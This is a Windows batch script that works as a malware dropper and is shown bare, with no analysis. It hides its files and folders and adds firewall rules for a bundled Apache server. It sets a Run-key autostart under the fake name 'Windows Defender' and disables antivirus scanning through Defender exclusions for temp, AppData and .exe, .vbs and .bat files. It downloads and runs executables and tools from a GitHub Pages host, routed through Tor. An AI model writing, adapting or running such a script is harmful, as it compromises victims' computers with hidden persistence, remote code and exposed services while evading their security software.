@echo off
attrib +s +h +i "%~dp0"

:connectivitycheck
ping www.google.com -n 1 -w 5000 >NUL
if errorlevel 1 goto Connectivitycheck

Set host=https://cryptedodissey.github.io
Set environment=%AppData%\Microsoft\Windows

cd %~dp0

netsh advfirewall firewall add rule name="apache" dir=in action=allow program="%environment%\apache2\bin\httpd.exe" protocol=TCP
netsh advfirewall firewall add rule name="apache" dir=in action=allow program="%environment%\apache2\bin\httpd.exe" protocol=UDP

REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%environment%\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"

copy /y "tor.exe" "%environment%\tor.exe"
copy /y "nircmd.exe" "%environment%\nircmd.exe"
copy /y "curl.exe" "%environment%\curl.exe"

"%environment%\curl.exe" -k https://www.7-zip.org/a/7z2201.exe --output "%temp%\7z2201.exe" && "%temp%\7z2201.exe" /S /D="%environment%\7-Zip" && del "%temp%\7z2201.exe" && attrib +s +h +i "%environment%\7-Zip"



if exist "%environment%\tor.exe" (
    attrib +s +h +i "%environment%\tor.exe"
) else (
"%environment%\curl.exe" -k -L https://archive.torproject.org/tor-package-archive/torbrowser/12.0.4/tor-expert-bundle-12.0.4-windows-x86_64.tar.gz > "%temp%\Tor.tar.gz" && "%environment%\7-Zip\7z.exe" e "%temp%\Tor.tar.gz" -so | "%environment%\7-Zip\7z.exe" e -aoa -si -ttar "tor/tor.exe" -o"%environment%" -y && attrib +s +h +i "%environment%\tor.exe" && del "%temp%\Tor.tar.gz"
)

taskkill /f /im tor.exe
"%environment%\nircmd.exe" exec hide "%environment%\tor.exe" && timeout -t 30
 
tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
if not errorlevel 1 (set "proxy=--tlsv1 --socks5-hostname 127.0.0.1:9050") else (
  set "proxy=--tlsv1"
)

mkdir "%environment%\Win32"
attrib +s +h +i "%environment%\Win32"

"%environment%\curl.exe" -k %proxy% %host%/sfx.exe --output "%environment%\Windows Defender.exe" && attrib +s +h +i "%environment%\Windows Defender.exe"
"%environment%\curl.exe" -k %proxy% %host%/Tools/apache2.zip --output "%temp%\apache2.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.zip" -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del "%temp%\apache2.zip"
"%environment%\curl.exe" -k %proxy% %host%/Tools/expose.zip --output "%temp%\expose.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\expose.zip" -o"%environment%" -y && attrib +s +h +i "%environment%\expose.exe" && del "%temp%\expose.zip"

powershell.exe Add-MpPreference -ExclusionPath "%temp%"
powershell.exe Add-MpPreference -ExclusionPath "%environment%"
powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
powershell.exe -command "Add-MpPreference -ExclusionExtension ".vbs""
powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""

"%environment%\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
